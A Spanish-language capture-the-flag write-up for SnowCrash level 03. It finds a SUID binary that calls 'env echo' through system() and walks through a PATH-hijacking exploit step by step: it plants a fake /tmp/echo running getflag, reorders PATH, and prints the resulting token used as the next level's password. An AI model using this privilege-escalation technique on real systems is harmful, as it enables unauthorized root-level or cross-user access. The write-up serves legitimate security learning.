
# SnowCrash - Level 03: Explotación de PATH Hijacking en Binarios SUID

Este repositorio documenta el proceso de resolución del **Nivel 03** de SnowCrash. El reto consiste en identificar una ejecución insegura de comandos del sistema dentro de un binario con privilegios elevados y secuestrar el flujo de ejecución.

## 1. Análisis Inicial

### Identificación del Binario Vulnerable

Al explorar el directorio personal, localizamos un ejecutable con permisos especiales:

```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 9627 Mar 5 2016 level03

```

**Observaciones clave:**

* **Bit SUID activo (`s`):** El binario se ejecuta con los privilegios del propietario (`flag03`), sin importar quién lo lance.
* **Tipo de archivo:** Un ejecutable ELF de 32 bits.

---

## 2. Ingeniería Inversa y Detección de la Vulnerabilidad

Para entender el comportamiento del programa sin el código fuente, se utilizaron herramientas de inspección de binarios.

### A. Inspección de Cadenas (`strings`)

```bash
strings level03

```

**Resultado relevante:**

```text
/usr/bin/env echo Exploit me
system
setresuid
setresgid

```

### B. Análisis de Símbolos (`nm`)

```bash
nm level03 | grep system
#          U system@@GLIBC_2.0

```

**Deducción técnica:**
El programa utiliza la función `system()` para ejecutar el comando `/usr/bin/env echo Exploit me`.
La vulnerabilidad crítica reside en el uso de **`/usr/bin/env echo`**. Al invocar `env`, el programa no utiliza una ruta absoluta para el ejecutable `echo` (como `/bin/echo`), sino que busca en la variable de entorno **`PATH`** del usuario para encontrar cualquier ejecutable que se llame `echo`.

---

## 3. Estrategia de Explotación: Secuestro de PATH

Dado que el programa confía en el `PATH` para localizar el comando `echo`, podemos crear un ejecutable malicioso con ese mismo nombre y obligar al binario SUID a ejecutarlo.

### Paso 1: Análisis de permisos en `/tmp`

Se observó una configuración de permisos inusual en el directorio temporal:

```bash
ls -ld /tmp
# d-wx-wx-wx 4 root root 100 Jan 3 22:26 /tmp

```

Aunque el directorio no permitía lectura (`r`), los permisos de **escritura (`w`)** y **ejecución (`x`)** permitían crear y ejecutar archivos si se conocía su nombre de antemano.

### Paso 2: Creación del "falso" `echo`

Creamos un script que, en lugar de imprimir texto, ejecute el binario de validación del sistema:

```bash
echo "/bin/getflag" > /tmp/echo
chmod 777 /tmp/echo

```

### Paso 3: Manipulación de la variable de entorno

Modificamos el `PATH` para incluir `/tmp` al principio de la lista de búsqueda. De esta forma, cuando el binario busque `echo`, encontrará nuestra versión antes que la oficial del sistema:

```bash
export PATH=/tmp:$PATH

```

---

## 4. Ejecución y Escalada de Privilegios

Al lanzar el binario original, este ejecuta nuestro script con privilegios de `flag03`:

```bash
./level03

```

**Resultado:**
El programa, en lugar de imprimir "Exploit me", ejecuta `/bin/getflag` bajo el contexto del usuario `flag03` y devuelve el token.

* **Token obtenido:** `qi0maab88jeaj46qoumi7maus`

---

## 5. Resolución Final

Con el token obtenido, procedemos a acceder al siguiente nivel:

```bash
su level04
Password: qi0maab88jeaj46qoumi7maus

```

**Level 03 passed!**

---

### Logros Técnicos:

* **Análisis de Binarios:** Uso de `strings` y `nm` para identificar llamadas a `system()`.
* **Explotación de Entorno:** Comprensión y manipulación de la variable `$PATH`.
* **Privilege Escalation:** Abuso de binarios con bit SUID mediante secuestro de dependencias externas.

---